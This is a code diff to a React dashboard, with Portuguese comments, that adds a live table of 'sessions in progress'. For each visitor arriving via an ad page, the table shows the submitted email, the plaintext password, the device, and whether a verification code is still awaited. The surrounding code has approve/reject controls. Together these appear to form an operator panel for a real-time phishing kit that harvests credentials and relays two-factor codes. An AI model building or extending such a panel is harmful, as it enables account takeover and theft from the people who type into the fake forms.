@@ -253,6 +253,44 @@ export default function Dashboard() {
   const live = attempts.filter((a) => actionableKeys.has(a.key));
   const history = attempts.filter((a) => !actionableKeys.has(a.key));
 
+  // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
+  // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
+  const activeSessions: ActiveSession[] = useMemo(() => {
+    const liveSessionIds = new Set(live.map((l) => l.session_id));
+    const bySession = new Map<string, LeadRow[]>();
+    for (const l of leads) {
+      const arr = bySession.get(l.session_id) || [];
+      arr.push(l);
+      bySession.set(l.session_id, arr);
+    }
+    const out: ActiveSession[] = [];
+    for (const [sid, items] of bySession) {
+      if (liveSessionIds.has(sid)) continue;
+      const emails = items.filter((i) => i.field_name === "email_submitted");
+      if (emails.length === 0) continue;
+      const sorted = [...items].sort((a, b) => a.created_at.localeCompare(b.created_at));
+      const lastActivity = sorted[sorted.length - 1].created_at;
+      // Se a última atividade dessa sessão foi um código, ela já virou tentativa (ao vivo ou histórico).
+      // Só mostra aqui se a última coisa foi e-mail/senha.
+      const lastField = sorted[sorted.length - 1].field_name;
+      if (lastField === "code_submitted") continue;
+      const email = [...emails].sort((a, b) => a.created_at.localeCompare(b.created_at)).pop()!.value;
+      const passwordRow = [...items]
+        .filter((i) => i.field_name === "password_submitted")
+        .sort((a, b) => a.created_at.localeCompare(b.created_at))
+        .pop();
+      out.push({
+        session_id: sid,
+        ad_id: items[0].ad_id,
+        email,
+        password: passwordRow?.value || "—",
+        user_agent: items.find((i) => i.user_agent)?.user_agent ?? null,
+        lastActivity,
+      });
+    }
+    return out.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity));
+  }, [leads, live]);
+
   const send = async (row: AttemptRow, action: "approve" | "reject") => {
     setBusy(`${row.key}-${action}`);
     const { error } = await supabase.from("ad_session_actions").insert({
@@ -303,11 +341,84 @@ export default function Dashboard() {
       <main className="mx-auto max-w-7xl px-6 py-8">
         {/* Cards de resumo */}
         <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
+          <StatCard label="Em andamento" value={activeSessions.length} icon={<Sparkles className="h-4 w-4" />} highlight={activeSessions.length > 0} />
           <StatCard label="Ao vivo" value={live.length} icon={<Radio className="h-4 w-4" />} highlight={live.length > 0} />
           <StatCard label="Aprovados" value={approvedCount} icon={<Check className="h-4 w-4" />} />
           <StatCard label="Rejeitados" value={rejectedCount} icon={<X className="h-4 w-4" />} />
-          <StatCard label="Total" value={attempts.length} icon={<Activity className="h-4 w-4" />} />
         </div>
+
+        {/* SESSÕES EM ANDAMENTO */}
+        <section className="mt-8 rounded-xl border border-border bg-card shadow-card">
+          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
+            <div className="flex items-center gap-2">
+              <Sparkles className="h-4 w-4 text-primary" />
+              <h2 className="text-base font-semibold">Sessões em andamento</h2>
+              <Badge variant="secondary" className="text-[10px]">{activeSessions.length}</Badge>
+            </div>
+          </div>
+
+          {activeSessions.length === 0 ? (
+            <div className="flex flex-col items-center gap-3 px-6 py-10 text-center">
+              <p className="text-sm text-muted-foreground">
+                Ninguém digitando agora. Quando alguém preencher o e-mail, aparece aqui.
+              </p>
+            </div>
+          ) : (
+            <div className="overflow-x-auto">
+              <table className="w-full text-sm">
+                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
+                  <tr>
+                    <th className="px-4 py-3 text-left font-medium">Última atividade</th>
+                    <th className="px-4 py-3 text-left font-medium">Anúncio</th>
+                    <th className="px-4 py-3 text-left font-medium">
+                      <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
+                    </th>
+                    <th className="px-4 py-3 text-left font-medium">
+                      <span className="inline-flex items-center gap-1"><KeyRound className="h-3 w-3" /> Senha</span>
+                    </th>
+                    <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
+                    <th className="px-4 py-3 text-left font-medium">Aguardando</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {activeSessions.map((s) => {
+                    const ad = adTitles[s.ad_id];
+                    const hasPassword = s.password !== "—";
+                    return (
+                      <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
+                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
+                          {formatTime(s.lastActivity)}
+                        </td>
+                        <td className="px-4 py-3 text-xs">
+                          {ad ? (
+                            <div className="flex flex-col">
+                              <span className="truncate font-medium">{ad.title}</span>
+                              <span className="truncate font-mono text-[10px] text-muted-foreground">/{ad.slug}</span>
+                            </div>
+                          ) : (
+                            <span className="text-muted-foreground">—</span>
+                          )}
+                        </td>
+                        <td className="break-all px-4 py-3 font-mono text-xs">{s.email}</td>
+                        <td className="break-all px-4 py-3 font-mono text-xs">
+                          {hasPassword ? s.password : <span className="text-muted-foreground">—</span>}
+                        </td>
+                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
+                          {deviceLabel(s.user_agent)}
+                        </td>
+                        <td className="whitespace-nowrap px-4 py-3 text-xs">
+                          <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                            {hasPassword ? "código" : "senha ou código"}
+                          </span>
+                        </td>
+                      </tr>
+                    );
+                  })}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </section>
 
         {/* AO VIVO */}
         <section className="mt-8 rounded-xl border border-primary/30 bg-card shadow-glow">
